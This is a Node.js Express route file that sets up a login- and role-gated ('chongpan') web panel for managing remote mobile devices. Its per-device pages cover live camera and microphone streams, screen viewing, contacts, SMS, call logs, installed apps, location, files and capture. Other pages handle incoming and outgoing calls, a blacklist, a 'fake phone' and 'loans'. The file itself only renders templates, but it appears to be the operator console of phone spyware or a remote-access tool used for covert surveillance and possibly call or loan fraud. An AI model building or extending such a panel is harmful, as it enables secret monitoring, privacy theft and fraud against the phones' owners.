require('rootpath')();

const requireLogin = require('middlewares/require_login');
const requireRole = require('middlewares/require_role');

function registerTestLogin(app) {
    if (process.env.TEST_USER) {
        const login = require('middlewares/login');
        app.use(login({ username: process.env.TEST_USER }));
    }
}

function registerUserSession(app) {
    const userSession = require('middlewares/user_session');
    app.use(userSession());
}

function fake_phone(req, res) {
    res.render('test/phone.ejs');
}

function mobiles(req, res) {
    res.render('test/mobiles.ejs');
}

function incalls(req, res) {
    res.render('test/incalls.ejs');
}

function outcalls(req, res) {
    res.render('test/outcalls.ejs');
}

function blacklist(req, res) {
    res.render('test/blacklist.ejs');
}

function calls(req, res) {
    res.render('test/calls.ejs');
}

function home(req, res) {
    res.render('test/index.ejs');
}

function loans(req, res) {
    res.render('test/loans.ejs');
}

function stream(req, res) {
    res.locals = {
        id: req.params.id,
        channel: req.params.channel,
    };
    res.render('test/stream.ejs');
}

function screen(req, res) {
    res.locals = {
        id: req.params.id,
    };
    res.render('test/screen.ejs');
}

function contacts(req, res) {
    res.locals = {
        id: req.params.id,
    };
    res.render('test/contacts.ejs');
}

function sms(req, res) {
    res.locals = {
        id: req.params.id,
    };
    res.render('test/sms.ejs');
}

function callLog(req, res) {
    res.locals = {
        id: req.params.id,
    };
    res.render('test/calllog.ejs');
}

function apks(req, res) {
    res.locals = {
        id: req.params.id,
    }
    res.render('test/apks.ejs');
}

function location(req, res) {
    res.locals = {
        id: req.params.id,
    };
    res.render('test/location.ejs');
}

function logs(req, res) {
    res.locals = {
        id: req.params.id,
    };
    res.render('test/logs.ejs');
}

function files(req, res) {
    res.locals = {
        id: req.params.id,
    };
    res.render('test/files.ejs');
}

function capture(req, res) {
    res.locals = {
        id: req.params.id,
    };
    res.render('test/capture.ejs');
}

module.exports = app => {

    // registerTestLogin(app);
    // registerUserSession(app);

    app.use('/test/*', requireLogin());
    app.use('/test/*', requireRole('chongpan'));

    app.get('/test', home);

    app.get('/test/phone', fake_phone);

    app.get('/test/mobiles', mobiles);
    app.get('/test/mobiles/:id/stream/:channel(camera|mic)', stream);
    app.get('/test/mobiles/:id/screen', screen);
    app.get('/test/mobiles/:id/contacts', contacts);
    app.get('/test/mobiles/:id/sms', sms);
    app.get('/test/mobiles/:id/calllog', callLog);
    app.get('/test/mobiles/:id/apks', apks);
    app.get('/test/mobiles/:id/location', location);
    app.get('/test/mobiles/:id/logs', logs);
    app.get('/test/mobiles/:id/files', files);
    app.get('/test/mobiles/:id/capture', capture);

    app.get('/test/incalls', incalls);
    app.get('/test/outcalls', outcalls);
    app.get('/test/blacklist', blacklist);
    app.get('/test/calls', calls);
    app.get('/test/loans', loans);
};